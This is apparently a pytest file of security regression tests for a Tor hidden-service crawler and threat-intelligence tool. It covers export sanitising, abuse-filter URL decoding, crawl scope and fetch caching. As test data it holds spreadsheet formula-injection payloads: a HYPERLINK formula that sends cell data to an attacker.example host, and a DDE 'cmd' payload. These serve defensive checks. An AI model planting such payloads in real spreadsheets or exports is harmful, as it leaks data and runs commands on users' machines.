# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 JacobJandon — https://github.com/JacobJandon/OnionClaw
"""Security hardening found in the post-release audit: crawl scope, URL handling,
the abuse filter's URL decoding, and spreadsheet formula injection in exports."""
import csv
import io
import os
import sys
import types
from urllib.parse import quote

import pytest
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

import entities  # noqa: E402
import iocs  # noqa: E402
import safety  # noqa: E402
import sicry  # noqa: E402
from collectors import OnionSiteCollector  # noqa: E402

V3 = "a" * 56 + ".onion"
BASE = f"http://{V3}"


# ── spreadsheet formula injection ────────────────────────────────
@pytest.mark.parametrize("title", ['=HYPERLINK("http://attacker.example/?d="&B2,"open")',
                                   "+cmd", "-2+3", "@SUM(A1)", "\t=1"])
def test_engine_csv_neutralises_formula_titles(title):
    row = next(csv.DictReader(io.StringIO(sicry.to_csv([{"url": BASE, "title": title}]))))
    assert row["title"] == "'" + title


def test_engine_csv_leaves_ordinary_titles_alone():
    row = next(csv.DictReader(io.StringIO(sicry.to_csv([{"url": BASE, "title": "Leak forum"}]))))
    assert row["title"] == "Leak forum"


def test_ioc_csv_export_neutralises_formula_cells(monkeypatch, tmp_path, capsys):
    row = {"type": "domain", "value": "evil.example", "first_seen": 1.7e9, "last_seen": 1.7e9,
           "groups": ["=cmd|' /C calc'!A0"], "sources": ["leaksites"], "flags": [],
           "context": "@SUM(1+1)", "score": 1}
    monkeypatch.setattr(iocs, "collect", lambda store: [row])
    monkeypatch.setattr(iocs, "filter_rows", lambda rows, *a, **k: rows)
    monkeypatch.setattr(iocs, "Store", lambda *a, **k: None)
    out = tmp_path / "x.csv"
    monkeypatch.setattr(sys, "argv", ["iocs.py", "--format", "csv", "-o", str(out)])
    iocs.main()
    got = next(csv.DictReader(io.StringIO(out.read_text())))
    assert got["groups"].startswith("'=") and got["context"].startswith("'@")


# ── the abuse filter decodes URLs before matching ─────────────────
# Inputs are built from the filter's own term lists rather than spelled out here.
MULTI = next(t for t in safety.HARD_TERMS if " " in t)
SOFT = safety.SOFT_TERMS[0]
EXPLICIT = next(t for t in safety.EXPLICIT_TERMS if " " not in t)


@pytest.mark.parametrize("encoded", [quote(MULTI), MULTI.replace(" ", "+"),
                                     quote(quote(MULTI)), f"{SOFT}%5F{EXPLICIT}"])
def test_encoded_terms_in_a_url_are_still_refused(encoded):
    assert not safety.is_safe(f"{BASE}/{encoded}/")


def test_decoding_does_not_refuse_legitimate_encoded_urls():
    assert safety.is_safe(f"{BASE}/victims/st%20mary%27s%20children%27s%20hospital/")


# ── which hidden service a URL points to ──────────────────────────
def test_subdomain_onions_are_recognised():
    assert entities.onion_host(f"https://www.{V3}/") == V3
    assert entities.service_host(f"http://blog.{V3}/post") == V3


@pytest.mark.parametrize("url", [f"https://{V3}.ly/", f"https://web.archive.org/web/2026/http://{V3}/",
                                 f"http://{V3}@collector.example/", f"https://stats.example/p.gif?site={V3}"])
def test_clearnet_urls_that_mention_an_onion_are_not_that_service(url):
    assert entities.service_host(url) == ""
    assert entities.onion_host(url) == V3          # still harvested as a mention


# ── crawl scope, de-duplication and full text ─────────────────────
@pytest.fixture
def crawl_mod():
    real = sys.modules.get("sicry")
    sys.modules["sicry"] = types.SimpleNamespace(fetch=None, __version__="test")
    try:
        import crawl
    finally:
        sys.modules["sicry"] = real
    return crawl


def _site(pages):
    calls = []

    def fetch(url, **kw):
        calls.append(url)
        body = pages.get(url)
        if body is None:
            return {"url": url, "status": 200, "title": "elsewhere",
                    "text": "donate 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", "links": []}
        return {"url": url, "status": 200, "title": "page", "text": body[0], "links": body[1]}
    return fetch, calls


def test_crawler_stays_on_the_hidden_service(crawl_mod):
    """Gateway, archive, userinfo and tracker URLs mention the onion but are clearnet."""
    links = [{"href": u} for u in (f"https://{V3}.ly/", f"https://web.archive.org/web/2026/{BASE}/",
                                   f"http://{V3}@collector.example/", f"https://stats.example/?site={V3}")]
    fetch, calls = _site({f"{BASE}/": ("home", links)})
    out = crawl_mod.crawl(BASE + "/", depth=1, delay=0, fetch=fetch)
    assert calls == [f"{BASE}/"] and out["pages_crawled"] == 1
    assert out["entities"]["btc_wallets"] == []


def test_crawler_fetches_each_document_once(crawl_mod):
    links = [{"href": f"{BASE}/#top"}, {"href": f"{BASE}/#about"}, {"href": f"{BASE}"},
             {"href": f"{BASE}/news#latest"}, {"href": f"{BASE}/news"}]
    fetch, calls = _site({f"{BASE}/": ("home", links), f"{BASE}/news": ("news", [])})
    out = crawl_mod.crawl(BASE, depth=1, max_pages=4, delay=0, fetch=fetch)
    assert sorted(calls) == [f"{BASE}/", f"{BASE}/news"] and out["pages_crawled"] == 2


def test_a_refused_link_is_counted_once(crawl_mod):
    bad = {"href": f"{BASE}/{quote(MULTI)}/"}
    fetch, _ = _site({f"{BASE}/": ("home", [bad, {"href": f"{BASE}/a"}]), f"{BASE}/a": ("a", [bad])})
    out = crawl_mod.crawl(BASE, depth=2, delay=0, fetch=fetch)
    assert len(out["refused"]) == 1


def test_crawler_asks_the_engine_for_the_whole_page(crawl_mod, monkeypatch):
    seen = {}

    def fetch(url, **kw):
        seen.update(kw)
        return {"url": url, "status": 200, "title": "t", "text": "x", "links": []}
    monkeypatch.setattr(crawl_mod, "sicry", types.SimpleNamespace(fetch=fetch))
    crawl_mod.crawl(BASE, depth=0, delay=0)
    assert seen.get("max_chars") == entities.FULL_TEXT_CHARS


def test_crawl_cli_fails_when_nothing_could_be_fetched(crawl_mod, monkeypatch):
    monkeypatch.setattr(crawl_mod, "sicry", types.SimpleNamespace(
        fetch=lambda url, **kw: {"url": url, "error": "host unreachable", "text": ""},
        _tor_port_open=lambda: True, __version__="test"))
    monkeypatch.setattr(sys, "argv", ["crawl.py", "--url", BASE, "--delay", "0", "--json"])
    assert crawl_mod.main() == 1


def test_crawl_cli_rejects_a_negative_delay(crawl_mod, monkeypatch):
    monkeypatch.setattr(sys, "argv", ["crawl.py", "--url", BASE, "--delay", "-1"])
    with pytest.raises(SystemExit) as e:
        crawl_mod.main()
    assert e.value.code == 2


def test_onion_monitor_asks_the_engine_for_the_whole_page(monkeypatch):
    seen = {}
    monkeypatch.setattr(sicry, "_tor_port_open", lambda *a, **k: True)
    monkeypatch.setattr(sicry, "fetch", lambda url, **kw: seen.update(kw) or {})
    OnionSiteCollector([BASE])._resolve_fetch()(BASE)
    assert seen.get("max_chars") == entities.FULL_TEXT_CHARS


# ── sicry.fetch: links, limits and its cache ──────────────────────
class _Page:
    def __init__(self, pages):
        self.pages, self.calls = pages, []

    def get(self, url, headers=None, timeout=None):
        self.calls.append(url)
        r = requests.models.Response()
        r.status_code, r.url, r.encoding = 200, url, "utf-8"
        r._content = self.pages[url].encode()
        return r


@pytest.fixture
def site(monkeypatch):
    def use(pages):
        s = _Page(pages)
        monkeypatch.setattr(sicry, "_pool_session", lambda: s)
        monkeypatch.setattr(sicry, "_FETCH_CACHE", {})
        monkeypatch.setattr(sicry, "_db", lambda: types.SimpleNamespace(cache_set=lambda *a: None))
        return s
    return use


def test_fetch_resolves_relative_and_protocol_relative_links(site):
    page = f"{BASE}/forum/index.php"
    hrefs = ["viewtopic.php?t=1", "./viewtopic.php?t=2", "../wiki/page.html", "?page=2",
             "/forum/viewtopic.php?t=3", "//b" + "b" * 55 + ".onion/x"]
    site({page: "<title>f</title>" + "".join(f'<a href="{h}">l</a>' for h in hrefs)})
    links = [ln["href"] for ln in sicry.fetch(page, _use_cache=False)["links"]]
    assert links == [f"{BASE}/forum/viewtopic.php?t=1", f"{BASE}/forum/viewtopic.php?t=2",
                     f"{BASE}/wiki/page.html", f"{BASE}/forum/index.php?page=2",
                     f"{BASE}/forum/viewtopic.php?t=3", "http://b" + "b" * 55 + ".onion/x"]


def test_fetch_limits_and_whole_page(site):
    url = f"{BASE}/long"
    site({url: "<title>t</title><p>" + "x" * 20000 + "</p>"})
    assert sicry.fetch(url, _use_cache=False)["truncated"] is True
    full = sicry.fetch(url, _use_cache=False, max_chars=0)
    assert full["truncated"] is False and "x" * 20000 in full["text"]


def test_fetch_cache_keeps_path_case_and_limits_apart(site):
    a, b = f"{BASE}/view/AbC123", f"{BASE}/view/abc123"
    s = site({a: "<title>first</title>one", b: "<title>second</title>two"})
    assert sicry.fetch(a)["title"] == "first"
    assert sicry.fetch(b)["title"] == "second"          # was served the first page
    sicry.fetch(a, max_chars=0)                          # different limit: not the cached copy
    assert s.calls == [a, b, a]
